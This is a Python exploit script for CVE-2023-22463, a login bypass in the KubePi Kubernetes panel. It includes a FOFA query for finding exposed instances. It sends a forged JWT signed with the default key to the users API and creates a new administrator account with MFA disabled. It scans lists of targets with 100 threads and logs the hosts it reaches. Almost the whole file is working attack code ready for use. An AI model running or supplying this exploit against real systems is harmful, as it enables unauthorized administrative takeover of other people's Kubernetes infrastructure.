#KubePi JwtSigKey 登陆绕过漏洞CVE-2023-22463
#fofa："kubepi"

import requests,sys,argparse,json
from multiprocessing.dummy import Pool
# 关闭警告
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗ ██╗             ██╗██╗    ██╗████████╗███████╗██╗ ██████╗ ██╗  ██╗███████╗██╗   ██╗
██║ ██╔╝██║   ██║██╔══██╗██╔════╝██╔══██╗██║             ██║██║    ██║╚══██╔══╝██╔════╝██║██╔════╝ ██║ ██╔╝██╔════╝╚██╗ ██╔╝
█████╔╝ ██║   ██║██████╔╝█████╗  ██████╔╝██║             ██║██║ █╗ ██║   ██║   ███████╗██║██║  ███╗█████╔╝ █████╗   ╚████╔╝ 
██╔═██╗ ██║   ██║██╔══██╗██╔══╝  ██╔═══╝ ██║        ██   ██║██║███╗██║   ██║   ╚════██║██║██║   ██║██╔═██╗ ██╔══╝    ╚██╔╝  
██║  ██╗╚██████╔╝██████╔╝███████╗██║     ██║███████╗╚█████╔╝╚███╔███╔╝   ██║   ███████║██║╚██████╔╝██║  ██╗███████╗   ██║   
╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝     ╚═╝╚══════╝ ╚════╝  ╚══╝╚══╝    ╚═╝   ╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝   
                                                                                                                            

"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="KubePi_JwtSigKey_登陆绕过漏洞CVE-2023-22463")
    parser.add_argument('-u','--url',dest='url',type=str,help="please input you url")
    parser.add_argument('-f','--file',dest='file',type=str,help="please input you file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in  fp.readlines(): 
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()

def poc(target):
    payload = "/kubepi/api/v1/users"
    headers = {
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/105.0.5195.127Safari/537.36',
        'accept':'application/json',
        'Accept-Encoding':'gzip,deflate',
        'Authorization':'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfX0.XxQmyfq_7jyeYvrjqsOZ4BB4GoSkfLO2NvbKCEQjld8',
    }
    data = {
  "authenticate": {
       "password": "{{randstr}}"
  },
  "email": "{{randstr}}@qq.com",
  "isAdmin": True,
  "mfa": {
          "enable": False
   },
  "name": "{{randstr}}",
  "nickName": "{{randstr}}",
  "roles": [
       "Supper User"
  ]
}
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res1 = requests.post(url=target+payload,headers=headers,json=data,verify=False,timeout=5,proxies=proxies)
        if res1.status_code==200 and 'apiVersion' in res1.text:
            print(f'[+]{target}存在漏洞')
            with open('result.txt','a',encoding='utf-8') as fp1:
                fp1.write(target+'\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except requests.RequestException as e:
        print(f"[-] 请求失败: {target}, 错误信息: {e}")
    except json.JSONDecodeError:
        print(f"[-] 无法解码JSON响应: {target}")
    except Exception as e:
        print(f"[-] 处理请求时出错: {target}, 错误信息: {e}")  



if __name__ =='__main__':
    main()

